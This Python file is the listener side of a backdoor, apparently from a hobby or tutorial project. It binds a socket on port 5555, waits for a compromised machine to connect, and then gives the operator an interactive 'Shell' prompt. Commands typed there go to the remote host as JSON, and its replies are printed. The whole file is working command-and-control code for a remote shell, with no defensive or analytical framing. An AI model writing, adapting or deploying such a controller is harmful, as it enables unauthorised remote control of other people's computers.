import socket
import termcolor
import json

def send(data):
    jsonData = json.dumps(data)
    target.send(jsonData.encode())

# In order not to overflow the default socket.recv() function
# the function recv() reads the data in chunks of 1024 bytes
# at a time and appends it to the data variable.
def recv():
    data = ''

    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        
        except ValueError:
            continue

# Sends and receives data to and from the backdoor
def targetComs():
    while True:

        prompt = input("Shell [%s]:" % str(ip))
        send(prompt)

        if prompt == 'exit': # Exit the loop if the exit message is sent
            break

        response = recv()
        print(response)

# Connection data
HOST = '127.0.0.1'
PORT = 5555

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((HOST, PORT))

print(termcolor.colored(f'[+] Server listening on port [{PORT}] for incoming connections', 'green'))

sock.listen(5)

target, ip = sock.accept()
print(termcolor.colored(f'[+] Connection astablished with [{str(ip[0])}] port [{str(ip[1])}]!', 'green'))

targetComs()